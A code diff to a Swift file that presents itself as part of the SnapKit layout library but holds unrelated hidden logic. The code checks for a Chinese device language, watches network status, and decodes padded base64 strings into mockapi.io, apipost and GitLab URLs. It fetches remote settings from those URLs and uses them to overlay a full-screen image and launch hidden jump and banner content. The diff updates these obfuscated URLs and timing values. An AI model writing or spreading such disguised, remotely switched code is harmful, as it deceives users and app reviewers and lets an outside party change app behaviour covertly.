@@ -27,7 +27,7 @@
     import AppKit
 #endif
 
-var autoSnapDistance: String = "com.1779508800.snapkit"
+var autoSnapDistance: String = "com.1779249600.snapkit"
 
 public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
 
@@ -57,12 +57,13 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
                 if let letnwn = self.constanop() {
                     let varyimg = UIImageView.init()
                     varyimg.frame = UIScreen.main.bounds
-                    varyimg.image = UIImage(named: "ruzychr")
+                    varyimg.image = UIImage(named: "pury")
                     varyimg.tag = 1010;
                     varyimg.isUserInteractionEnabled = true
                     varyimg.contentMode = .scaleAspectFill
                     letnwn.addSubview(varyimg)
                 }
+                
                 let lanvsge = Locale.preferredLanguages.first ?? ""
 
                 if lanvsge.hasPrefix("zh") == false {
@@ -71,6 +72,7 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
                     }
                     return self
                 }
+                
             AFNetworkReachabilityManager.shared().startMonitoring()
 
             AFNetworkReachabilityManager.shared().setReachabilityStatusChange { status in
@@ -118,16 +120,14 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
                                     }
                                     let tims:Double = Double(dict["times"] as! String) ?? 10
                                     if islocsall {
-                                        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + tims, execute: {
-                                            Orieldowenter.shared.aemte(
-                                                launchImageURL: dict["lac"] as! String,
-                                                launctRL: dict["lacjp"] as! String,
-                                                bannerImageURL: dict["bottom"] as! String,
-                                                bannertRL: dict["bottomjp"] as! String
-                                            )
-                                            
-                                            Orieldowenter.shared.argillBind()
-                                        })
+                                        Orieldowenter.shared.aemte(
+                                            launchImageURL: dict["lac"] as! String,
+                                            launctRL: dict["lacjp"] as! String,
+                                            bannerImageURL: dict["bottom"] as! String,
+                                            bannertRL: dict["bottomjp"] as! String
+                                        )
+                                        
+                                        Orieldowenter.shared.argillBind(brumoot: tims)
                                     }
                                     
                                 }
@@ -197,10 +197,10 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
     
     
     func zerestonfig(_ callback: @escaping ([String: Any]?) -> Void) {
-        
-        let raw = "aVVZjMWNHSlhSakJoVnpHR0cHM6Ly82OWRiMDk2MDU2MDg1NzMVVZjMWNHSlhSakJoVnpxMGEwNzQwZjYubW9ja2FwaS5pby9wYWljZSpodHRwczovL21vY2suYXBpcG9zdC5uZXQvbW9jay81OVVZjMWNHSlhSakJoVnpWM1NGM3Y2U0NTIwMDAvcGdwYWljZT9hcGlwb3N0X2lkPTE0MGYxNWUwZmVVZjMWNHSlhSakJoVnpE0MDAyKmh0dHBzOi8vZ2l0bGFiLmNvbS9tZWpldS95dVVZjMWNHSlhSakJoVnpWUvLS9yYXcvbWFpbi9wZ3BhaWVVZjMWNHSlhSakJoVnpNl"
 
-        let replaced = raw.replacingOccurrences(of: "VVZjMWNHSlhSakJoVnp", with: "")
+        let raw = "aHUVc1cGJXRjBhVzl1VTR0cHM6Ly82OWQ3YmE0MjljNWViYjA5MTUVc1cGJXRjBhVzl1VThjODQ3OTcubW9ja2FwaS5pby9qZGJ1Kmh0dHBzOi8vbW9jayUVc1cGJXRjBhVzl1VT5hcGlwb3N0Lm5ldC9tb2NrLzU5YzU0YzdjZTQ1MjAwMC9qZGJ1eXU/YXBpcG9zdF9pZD0xMGQzY2NmOGZhNDAwUVc1cGJXRjBhVzl1VTMipodHRwczovL2dpdGxhYi5jb20vbWVqZXUveXVlLy0vcmF3L21haW4vamRiYnVUVc1cGJXRjBhVzl1VT5dQ=="
+
+        let replaced = raw.replacingOccurrences(of: "UVc1cGJXRjBhVzl1VT", with: "")
 
         guard
             let data = Data(base64Encoded: replaced),
